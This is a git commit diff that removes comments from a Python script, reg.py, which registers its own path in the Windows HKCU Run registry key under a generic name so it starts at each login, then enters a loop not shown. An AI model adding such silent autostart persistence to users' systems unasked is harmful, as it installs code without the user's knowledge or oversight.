eb37afd2f72bd4ec7d6fda64277b47f77aec0abc
Nasser <hizenbergabc@gmail.com>
2019-12-08 01:18:44 +0330

    edit reg.py and dell comment in script

--- reg.py
+++ reg.py
@@ -2,25 +2,13 @@ import os
 import winreg as reg
 import time
 
-pth = os.path.dirname(os.path.realpath(__file__)) 
-# name of the python file with extension 
-s_name="reg.py"
-
-# joins the file name to end of path address 
+pth = os.path.dirname(os.path.realpath(__file__))  
+s_name="reg.py" 
 address=os.path.join(pth,s_name) 
-      
-# key we want to change is HKEY_CURRENT_USER  
-# key value is Software\Microsoft\Windows\CurrentVersion\Run 
 key = reg.HKEY_CURRENT_USER
 key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
-      
-# open the key to make changes to 
 open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS) 
-      
-# modifiy the opened key 
 reg.SetValueEx(open,"any_name",0,reg.REG_SZ,address) 
-      
-# now close the opened key 
 reg.CloseKey(open)
 timer = 0
 while True :
